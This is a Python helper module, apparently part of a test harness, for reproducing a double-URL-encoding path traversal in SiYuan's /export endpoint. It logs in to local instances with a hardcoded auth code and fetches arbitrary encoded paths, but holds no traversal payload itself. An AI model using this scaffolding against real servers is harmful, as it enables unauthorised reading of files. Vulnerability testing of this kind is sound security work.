"""Shared plumbing for siyuan-cve-2026-41894 (path traversal via double URL encoding)."""

import http.cookiejar
import urllib.request
import urllib.parse
import json

BASE = {"v0": "http://127.0.0.1:56910", "v1": "http://127.0.0.1:56911", "v2": "http://127.0.0.1:56912"}
AUTH_CODE = "pcb"


def login_session(version: str):
    """POST /api/system/loginAuth and return an authed urllib opener with cookie jar."""
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    base = BASE[version]
    data = json.dumps({"authCode": AUTH_CODE}).encode()
    try:
        op.open(urllib.request.Request(
            f"{base}/api/system/loginAuth", data=data,
            headers={"Content-Type": "application/json"}), timeout=15).read()
    except Exception:
        pass
    return op


def get_export(version: str, encoded_path: str) -> tuple:
    """GET /export/<encoded_path>; returns (status, body)."""
    op = login_session(version)
    base = BASE[version]
    try:
        with op.open(urllib.request.Request(f"{base}/export/{encoded_path}"), timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:200]
    except Exception as e:
        return 500, str(e)[:100]
